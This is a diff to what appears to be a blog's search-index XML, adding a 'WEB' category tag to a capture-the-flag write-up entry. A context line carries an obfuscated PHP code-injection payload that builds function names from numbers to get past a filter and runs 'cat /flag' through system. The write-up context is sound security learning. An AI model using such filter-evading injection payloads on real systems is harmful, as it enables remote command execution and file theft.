@@ -81,6 +81,7 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;pi&#125;($$pi&#123;abs&#125;)&amp;pi&#x3D;system&amp;abs&#x3D;cat &#x2F;flag</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>CTF</category>
+        <category>WEB</category>
       </categories>
   </entry>
   <entry>
